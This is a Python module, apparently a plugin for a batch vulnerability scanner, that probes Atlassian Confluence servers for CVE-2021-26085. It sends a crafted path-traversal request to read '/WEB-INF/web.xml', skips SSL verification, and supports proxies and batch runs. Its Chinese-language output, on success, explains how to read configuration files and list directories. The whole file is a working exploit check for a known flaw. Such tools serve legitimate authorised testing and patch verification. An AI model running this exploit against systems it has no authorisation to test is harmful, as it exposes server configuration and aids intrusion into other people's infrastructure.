# body="./images/lg_05_1.gif"
import requests,urllib3
from libs.outprint import OutPrintInfo,OutPrintInfoSuc
from libs.reqset import ReqSet
from libs.output import OutPutFile
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Cve_2021_26085:
	def scan(self,baseurl):
		url=baseurl+"/s/666/_/;/WEB-INF/web.xml"
		try:
			response = requests.get(url=url,headers=self.headers,verify=self.ssl,proxies=self.proxy,timeout=15)
			if response.status_code==200 and response.url == url:
				if not self.batch:
					OutPrintInfoSuc("Atlassian","存在Atlassian Confluence CVE-2021-26085受限的⽂件读取")
					OutPrintInfo("Atlassian","[b bright_red]decoratorName=/WEB-INF/web.xml 读取配置⽂件")
					OutPrintInfo("Atlassian","[b bright_red]decoratorName=/或.，可查看⽬录⽂件")
					OutPrintInfo("Atlassian",url)
				else:
					OutPrintInfoSuc("Atlassian", f"存在受限的⽂件读取 {url}")
					OutPutFile("atlassian_2021_26085.txt",f"存在Atlassian Confluence CVE-2021-26085受限的⽂件读取{url}")
				return True
			else:
				if not self.batch:
					OutPrintInfo("Atlassian","不存在Atlassian Confluence CVE-2021-26085受限的⽂件读取")
		except Exception:
			if not self.batch:
				OutPrintInfo("Atlassian", "目标请求出错")


	def main(self,target):
		self.batch = target["batch_work"]
		url = target["url"].strip('/ ')
		self.ssl = target["ssl"]
		header = target["header"]
		proxy = target["proxy"]
		if not self.batch:
			req = ReqSet(header=header, proxy=proxy)
			self.proxy = req["proxy"]
			self.headers = req["header"]
		else:
			self.proxy = {"http": proxy, "https": proxy}
			req = ReqSet(header=header)
			self.headers = req["header"]
		if not self.batch:
			OutPrintInfo("Atlassian", '开始执行Atlassian Confluence CVE-2021-26085漏洞...')
		self.scan(url)

		if not self.batch:
			OutPrintInfo("Atlassian", 'Atlassian Confluence CVE-2021-26085漏洞检测结束')